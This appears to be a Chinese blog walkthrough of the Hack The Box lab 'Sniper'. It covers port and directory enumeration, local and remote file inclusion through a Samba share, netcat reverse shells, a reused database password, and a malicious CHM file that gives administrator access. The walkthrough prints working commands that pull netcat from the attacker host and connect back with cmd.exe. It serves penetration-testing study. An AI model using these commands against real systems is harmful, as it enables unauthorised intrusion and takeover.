---
title: 'Hack the box: Sniper'
date: 2020-09-22 20:35:57
tags:
- htb
categories:
- [htb]
---

![](https://p3.ssl.qhimg.com/t014580c5bb32d4ece8.png)

## 0x00 前言

**- 关于Hack the box：**[Hack The Box](https://www.hackthebox.eu/)是一个全球知名的渗透测试靶机平台，在这个平台上，靶机区分为两种状态`active`、`retired`。对于`retired`状态的靶机，需要成为付费vip才能访问（£100/年或者£10/月）。

**- 关于Sniper lab：**我在寻找测试靶机的过程中，发现Sniper在处于`retired`状态下依然可以访问，白嫖的感觉真香 =）。下图是对Sniper的简要介绍：

![](https://p1.ssl.qhimg.com/t0144b24717475e936d.png)

![](https://p0.ssl.qhimg.com/t012807f73730007771.png)

**- 渗透测试工具：**kali、masscan、nmap、gobuster、samba、powershell、netcat

## 0x02 信息收集

连接hack the box 个人账户VPN，分配ip：10.10.14.67。

使用`masscan`对靶机Sniper的ip：10.10.10.151 进行扫描，发现开放端口80、135、139、445、49667：


```shell
~ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.151 --rate=1000
```

![](https://p5.ssl.qhimg.com/t019cda3c6a4d431ddf.png)

使用`nmap`收集对应端口的服务信息：


```shell
~ nmap -n -v -Pn -p80,135,139,445,49667 -A --reason -oN nmap.txt 10.10.10.151
```

![](https://p5.ssl.qhimg.com/t01ff516230b63cfd5c.png)

经过分析决定从http服务入手进行渗透。访问10.10.10.151，查看到主页：

![](https://p5.ssl.qhimg.com/t01265bcba4e3ac0566.png)

使用`gobuster`进行文件/目录枚举：


```shell
~ ./gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 20 -x php,html -u http://10.10.10.151/

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.151/
[+] Threads:        20
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2020/03/31 20:30:29 Starting gobuster
===============================================================
/Blog (Status: 301)
/Images (Status: 301)
/Index.php (Status: 200)
/blog (Status: 301)
/css (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/user (Status: 301)
===============================================================
2020/03/31 21:19:35 Finished
===============================================================
```

通过枚举，发现/blog、/user等有用的信息：

![](https://p0.ssl.qhimg.com/t01384d344c9d495d50.png)

![](https://p1.ssl.qhimg.com/t01b53ae09d26b3fbee.png)

## 0x03 文件包含漏洞

**- 本地文件包含（Local File Inclusion）**

在检查blog页面时，发现`/blog?lang=***.php`，这种形式的GET请求，在参数处尝试文件包含漏洞是一个不错的选择：

![](https://p0.ssl.qhimg.com/t014ab237e08c01167c.png)

![](https://p1.ssl.qhimg.com/t01b32f21c83e2300ab.png)

尝试访问绝对路径下的`win.ini`信息：`http://10.10.10.151/blog?lang=/windows/win.ini`，成功读取到信息：

![](https://p5.ssl.qhimg.com/t013fb5a5fe6b8ea582.png)

**- 远程文件包含漏洞（Remote File Inclusion）**

由本地文件包含漏洞的思路出发，尝试远程文件包含漏洞，这里的思路是使用Samba服务建立公共共享。

配置`smb.conf`：

```txt
...
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = kali
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

# add to the end
[evil]
   path = /home/sniper
   writable = yes
   guest ok = yes
   guest only = yes
   read only = no
   create mode = 0777
   directory mode = 0777
   force user = nobody
```

构造`php.info`文件，并启动Samba服务，检测远程文件包含漏洞是否存在。经过检测，确实存在，成功读取到信息：

![](https://p5.ssl.qhimg.com/t0152ca3cbd748d4cc5.png)

![](https://p3.ssl.qhimg.com/t01746962ef968ff3e9.png)

## 0x04 获取低级用户的shell

构造`cmd.php`、`evil.sh`，实现命令执行，并查看到当前用户名`iusr`：

![](https://p4.ssl.qhimg.com/t014804465010e5f8b1.png)

```shell
~ ./evil.sh whoami    
nt authority\iusr
```

为了获得一个反向shell（reverse shell），需要使用`evil.sh`上传`netcat.exe`到靶机中。这里尝试了一些文件目录都没有成功，我猜测应该是`iusr`的权限问题。最终在`C:\windows\system32\spool\drivers\color\`目录中成功上传`2.exe`(netcat)：

```
~ ./evil.sh 'powershell /c iwr \\10.10.14.67/evil/nc64.exe -outf \windows\system32\spool\drivers\color\2.exe'    

~./evil.sh 'dir \windows\system32\spool\drivers\color\'                                                          
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\windows\system32\spool\drivers\color

03/31/2020  03:21 PM    <DIR>          .
03/31/2020  03:21 PM    <DIR>          ..
03/31/2020  03:21 PM            43,696 2.exe
09/15/2018  12:12 AM             1,058 D50.camp
09/15/2018  12:12 AM             1,079 D65.camp
09/15/2018  12:12 AM               797 Graphics.gmmp
09/15/2018  12:12 AM               838 MediaSim.gmmp
09/15/2018  12:12 AM               786 Photo.gmmp
09/15/2018  12:12 AM               822 Proofing.gmmp
09/15/2018  12:12 AM           218,103 RSWOP.icm
09/15/2018  12:12 AM             3,144 sRGB Color Space Profile.icm
09/15/2018  12:12 AM            17,155 wscRGB.cdmp
09/15/2018  12:12 AM             1,578 wsRGB.cdmp
              11 File(s)        289,056 bytes
               2 Dir(s)  17,876,930,560 bytes free
```

kali监听1234端口，并建立反向shell连接，成功获取`iusr`的shell：

```
~ ./evil.sh 'start \windows\system32\spool\drivers\color\2.exe 10.10.14.67 1234 -e cmd.exe'
```

![](https://p5.ssl.qhimg.com/t018dd1a71f5ecc2e04.png)

## 0x05 提权——普通用户

利用`iusr`用户权限寻找有用的信息，发现靶机还有两个用户`Administrator`、`Chris`。在`C:\inetpub\wwwroot\user\db.php`中找到密码`36mEAhz/B8xQ~2VM`，我猜测这个应该就是`Chris`的密码：

```php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

查看`Chris`的相关权限，发现他具有远程执行powershell的权限：

![](https://p2.ssl.qhimg.com/t01692336bc9e0c316d.png)

进入powershell，配置`Chirs`认证信息：

```powershell
> $pw = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential("snipe\chris", $pw)
> Enter-PSSession -ComputerName SNIPER -Credential $cred
```

kali监听4321段端口，成功获取`Chris`的反向shell：

```powershell
> Start-Process -FilePath "\windows\system32\spool\drivers\color\2.exe" -ArgumentList "10.10.14.67 4321 -e cmd.exe" -NoNewWindow
```

![](https://p4.ssl.qhimg.com/t01eb7a4043722217ff.png)

**- 成功获得普通用户权限，拿到`user flag`:**

![](https://p0.ssl.qhimg.com/t01197680466fc12bc6.png)

## 0x06 提权——超级用户

在利用`Chris`权限寻找有用信息的过程中，在`C:\Docs\`、`C:\Users\Chris\Downloads\`目录下发现`note.txt`、`instructions.chm`两个有意思的文件：

![](https://p1.ssl.qhimg.com/t01d4342a8a1364e108.png)

![](https://p1.ssl.qhimg.com/t018036c5c6b19d0135.png)

从`note.txt`的留言信息中可以推测，老板对Chris的工作很不满意，需要将某个说明文档放到`C:\Docs\`目录中。而`.chm`文件就是通过html文件编译形成的“帮助文档”，所以我推测`instructions.chm`应该就是老板口中需要放在`C:\Docs\`目录中的文档。但当我将`C:\Users\Chris\Downloads\`目录下的`instructions.chm`复制到`C:\Docs\`中时，发现一个奇怪的现象，`instructions.chm`会在短时间内奇怪的消失。

![](https://p1.ssl.qhimg.com/t01af1e4ef21c0f672f.png)

文档消失，或许是超级用户删除？让我感到这可能就是超级用户的漏洞点所在。为了利用这一疑点，首先需要构造一个恶意的`.chm`文件，包含需要执行的反向shell恶意代码，当超级用户对这个恶意文档有任何操作的时候，就能获取到超级用户的shell。

我在github上寻找如何构造恶意的`.chm`文件，在这里找到了可以借用的范本：https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1 。为了构造`.chm`恶意文件，还需要下载微软的[HTML HELP Workshop](https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138)。

这里我在本地计算机中使用`powershell`，构造了一个名为`doc.chm`的恶意文件，`Payload "C:\windows\system32\spool\drivers\color\2.exe -e powershell 10.10.14.67 8888"`：

![](https://p0.ssl.qhimg.com/t01d2b6096bb7125c05.png)

![](https://p1.ssl.qhimg.com/t01dd14e4b379cdc223.png)

随后将`doc.chm`放入kali的samba共享目录中：

![](https://p3.ssl.qhimg.com/t01ccde97607c96c3fd.png)

kali监听8888端口，用`Chris`的权限进入`C:\Docs\`，从Samba共享目录中将`doc.chm`复制到当前目录，并命名为`instructions.chm`：

```powershell
PS C:\Docs> iwr \\10.10.14.67/evil/doc.chm -outf .\instructions.chm
```

等待片刻，成功获取到超级用户的反向shell：

![](https://p0.ssl.qhimg.com/t014ab2831a0b14f4cb.png)

**- 成功获得超级用户权限，拿到` flag`:**

![](https://p1.ssl.qhimg.com/t01d8daafa316484acd.png)

## 0x07 总结

对Sniper靶机的渗透测试思路进行一个简单的总结：

- **- 信息收集：**查看端口、服务状态，获取网站目录
- **- 验证`LFI`和`RFI`漏洞**
- **- 通过Samba服务利用`RFI`漏洞**：获得iuser的shell
- **- 搜寻获取`Chris`的用户凭证**
- **- 使用`Chris`角色在powershell中执行命令，获得`Chris`的shell**：拿到user flag
- **- 构造恶意的`.chm`文件**：包含反向shell的恶意代码
- **- 将恶意文件放入指定目录，等待超级用户执行操作，获取超级用户的shell：**拿到root flag